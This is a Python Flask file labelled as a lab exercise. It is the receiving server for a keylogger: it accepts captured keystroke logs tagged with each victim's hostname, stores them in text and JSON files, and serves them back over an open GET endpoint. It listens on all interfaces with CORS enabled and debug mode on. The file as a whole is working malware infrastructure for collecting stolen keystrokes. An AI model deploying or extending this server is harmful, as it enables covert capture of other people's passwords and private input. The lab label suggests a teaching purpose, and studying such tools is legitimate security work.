#!/usr/bin/env python3
"""
Lab 13: Keylogger Server
API server that receives and stores keylog data from clients
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import os
from datetime import datetime
import json

app = Flask(__name__)
CORS(app)  # Enable CORS for cross-origin requests

# Directory to store received logs
LOG_STORAGE_DIR = "received_logs"
LOG_FILE = os.path.join(LOG_STORAGE_DIR, "all_logs.txt")
JSON_LOG_FILE = os.path.join(LOG_STORAGE_DIR, "logs.json")

# Ensure storage directory exists
os.makedirs(LOG_STORAGE_DIR, exist_ok=True)

@app.route('/api/logs', methods=['POST'])
def receive_logs():
    """
    Receives keylog data from client and saves it to storage
    """
    try:
        data = request.get_json()
        
        if not data or 'logs' not in data:
            return jsonify({"error": "Invalid data format"}), 400
        
        # Extract data
        timestamp = data.get('timestamp', datetime.now().isoformat())
        hostname = data.get('hostname', 'unknown')
        logs = data.get('logs', '')
        
        # Save to text file (append mode)
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"{'='*60}\n")
            f.write(logs)
            f.write(f"\n{'='*60}\n\n")
        
        # Also save to JSON file for structured data
        log_entry = {
            "timestamp": timestamp,
            "hostname": hostname,
            "logs": logs
        }
        
        # Load existing logs or create new list
        if os.path.exists(JSON_LOG_FILE):
            with open(JSON_LOG_FILE, 'r', encoding='utf-8') as f:
                try:
                    all_logs = json.load(f)
                except json.JSONDecodeError:
                    all_logs = []
        else:
            all_logs = []
        
        # Append new log entry
        all_logs.append(log_entry)
        
        # Save back to JSON file
        with open(JSON_LOG_FILE, 'w', encoding='utf-8') as f:
            json.dump(all_logs, f, indent=2, ensure_ascii=False)
        
        print(f"[RECEIVED] Logs from {hostname} at {timestamp}")
        print(f"[INFO] Log length: {len(logs)} characters")
        
        return jsonify({
            "status": "success",
            "message": "Logs received and saved",
            "timestamp": timestamp
        }), 200
        
    except Exception as e:
        print(f"[ERROR] Failed to process logs: {str(e)}")
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

@app.route('/api/logs', methods=['GET'])
def get_logs():
    """
    Retrieve stored logs (for viewing)
    """
    try:
        if os.path.exists(JSON_LOG_FILE):
            with open(JSON_LOG_FILE, 'r', encoding='utf-8') as f:
                logs = json.load(f)
            return jsonify({
                "status": "success",
                "count": len(logs),
                "logs": logs
            }), 200
        else:
            return jsonify({
                "status": "success",
                "count": 0,
                "logs": []
            }), 200
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({"status": "online"}), 200

if __name__ == '__main__':
    print("="*60)
    print("Keylogger Server Started")
    print("="*60)
    print(f"Storage directory: {os.path.abspath(LOG_STORAGE_DIR)}")
    print(f"Text log file: {LOG_FILE}")
    print(f"JSON log file: {JSON_LOG_FILE}")
    print(f"API endpoint: http://localhost:8000/api/logs")
    print("="*60)
    
    app.run(debug=True, port=8000, host='0.0.0.0')

